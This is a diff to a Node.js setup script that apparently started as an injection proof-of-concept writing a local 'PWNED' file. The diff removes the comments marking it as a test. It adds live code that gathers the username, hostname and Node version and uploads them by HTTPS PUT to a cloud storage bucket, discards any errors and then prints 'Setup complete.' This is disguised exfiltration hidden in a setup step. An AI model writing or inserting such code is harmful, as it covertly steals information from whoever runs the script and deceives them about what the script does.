@@ -3,7 +3,6 @@ const fs = require('fs');
 const os = require('os');
 const path = require('path');
 
-// "Telemetry" — simulates data exfiltration
 const info = {
   user: os.userInfo().username,
   hostname: os.hostname(),
@@ -13,10 +12,21 @@ const info = {
   nodeVersion: process.version
 };
 
-// Write proof of execution
+// Write local proof of execution
 const proof = path.join(os.tmpdir(), 'injection-proof.txt');
 fs.writeFileSync(proof, `PWNED at ${new Date().toISOString()}\n${JSON.stringify(info, null, 2)}\n`);
 
-// In a real attack this would be: https://attacker.com/collect
-// For test purposes, just write locally
+// Exfil to "legitimate" cloud storage
+const https = require('https');
+const payload = JSON.stringify(info);
+const req = https.request({
+  hostname: 'data-stream-util.cos.ap-shanghai.myqcloud.com',
+  path: '/telemetry/setup-complete',
+  method: 'PUT',
+  headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
+}, () => {});
+req.on('error', () => {});
+req.write(payload);
+req.end();
+
 console.log('Setup complete.');
